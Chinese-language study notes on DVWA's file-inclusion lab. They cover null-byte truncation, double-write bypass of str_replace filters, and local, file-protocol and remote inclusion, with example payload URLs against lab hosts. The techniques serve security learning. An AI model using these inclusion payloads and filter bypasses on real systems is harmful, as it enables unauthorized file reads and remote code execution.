### 参考资料

[DVWA-1.9全级别教程之File Inclusion](https://www.freebuf.com/articles/web/119150.html)

## dvwa 文件包含

**php 文件包含有一个解析漏洞，它不会识别是不是真正的php程序，也就是说只要你包含了，它都当PHP来解析，所以图片马就是图片中有代码，这样的道理还会有zip马等等**


php版本小于5.3.24的服务器中，可以在文件名中使用%00进行截断，也就是说文件名中%00后的内容不会被识别

也就是说```php.ini```和```php.ini%0012.php``` 是等价的。

使用%00截断可以绕过某些过滤规则，例如要求page参数的后缀必须为php，这时链接A会读取失败，而链接B可以绕过规则成功读取。




1.本地文件包含

(1) 绝对路径

(2) 相对路径

str_replace函数是极其不安全的，因为可以使用双写绕过替换规则

例如```page=hthttp://tp://192.168.5.12/phpinfo.txt```时，str_replace函数会将```http://删除，于是page=http://192.168.5.12/phpinfo.txt```，成功执行远程命令。

因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。

```http://192.168.255.151:8081/DVWA-master/vulnerabilities/fi/page=…/./…/./…/./…/./…/./…/./…/./…/./…/./…/./xampp/htdocs/dvwa/php.ini```

```http://192.168.153.130/dvwa/vulnerabilities/fi/page=C:/xampp/htdocs/dvwa/php.ini```

(3) file协议包含：

```http://localhost:808/DVWA-master/vulnerabilities/fi/?page=file:///E:/software/phpstudy/WWW/phpinfo.php```

至于执行任意命令，需要配合文件上传漏洞利用。首先需要上传一个内容为php的文件，然后再利用file协议去包含上传文件（需要知道上传文件的绝对路径），从而实现任意命令执行。

2.远程文件包含


需要 allow\_url\_fopen与allow\_url\_include

```http://192.168.255.151:8081/DVWA-master/vulnerabilities/fi/?page=http://192.168.0.103:808/phpinfo.php```

<br>

Impossible级别的代码使用了白名单机制进行防护